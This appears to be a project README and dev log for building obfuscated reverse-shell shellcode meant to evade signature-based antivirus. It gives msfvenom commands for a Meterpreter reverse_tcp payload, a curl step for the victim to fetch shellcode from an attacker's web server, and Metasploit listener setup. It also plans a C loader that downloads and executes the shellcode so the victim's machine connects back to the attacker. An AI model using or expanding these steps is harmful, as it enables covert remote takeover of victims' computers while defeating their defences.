# reverse-shell
Obfuscated reverse-shell shellcode aimed to bypass signature-based antivirus

# 10/16/2024
  Steps needed in the main c program:
  
      - Download shellcode payload (HTTP GET REQUEST)
      
      - parse shellcode properly:
          - there should be no Null bytes (0x00), Line feeds (0x0A), carriage returns (0x0D), or Form feeds (0x0C)
          - only the shellcode instructions stored into char* memBuffer. 
          - then, loop through memBuffer[] and save contents as hexidecimal machine code to the dynamically 
              allocated unsigned char shellcode[]
              
      - execute machine code within shellcode[]

  Uploaded main.cpp

    Right now, the main.cpp downloads the shellcode, converts it to dynamic allocated memory that is reconizable to the system as hexidecimal instructions , and prints the the converted shellcode.
    
  Here is the shellcode before conversion:
  ![Before](payload-before-conversion.png)

  Here is the shellcode after conversion:
  ![After}(payload-after-conversion-raw.png)


    We still need to figure out how to execute this shellcode so that it connects the user to the attacker.


  # 10/15/2024
  To-do: create a c program to download the shellcode and execute it. 
  
      Russell:
          Check out this code generated by chatGPT:     https://chatgpt.com/share/670ecd31-e6f4-8007-975a-aa463a4bbc49
           It lays the foundation for what we are attempting to do. It has not been tested thoroughly but is a good reference
           to the steps required for the program executable.



# 10/14/2024:
    
    Russell:
      - created GitHub repo and uploaded the research paper as well as our proposal.
      - created and uploaded payload-22.c

  To create a payload (using kali):
            
      $msfvenom -p windows/meterpreter/reverse_tcp lhost={IP of attacker} lport={port #} --format c -o payload-22.c -b "\x00\x0A\x0\x0C\x0D"
      
  To download the shellcode as a victim via web server:
    
      $curl {your http web server}/download.php > payload-22.txt
      
  Attacker must have Metasploit installed in order to listen for the victim's connection on a port.  
      To download the metasploit installer:
      
      $curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
      $chmod 755 msfinstall
      $./msfinstall
      $sudo msfconsole
      

  To run a listener on attackers machine:
      
      $msfconsole
      $use exploit/multi/handler
      $set PAYLOAD windows/x64/meterpreter/reverse_tcp
      $set LHOST your_ip
      $set LPORT 4444
      $exploit
      

  Once the victim has executed the reverse shell, the attacker will see "Meterpreter session 1 opened." Lastly, the
      attacker enters the following command to enter the shell of the victim:
      
      $shell



  For a broad video explanation watch the following youtube video:
      https://www.youtube.com/watch?v=17JontiMrWQ


      

  

    
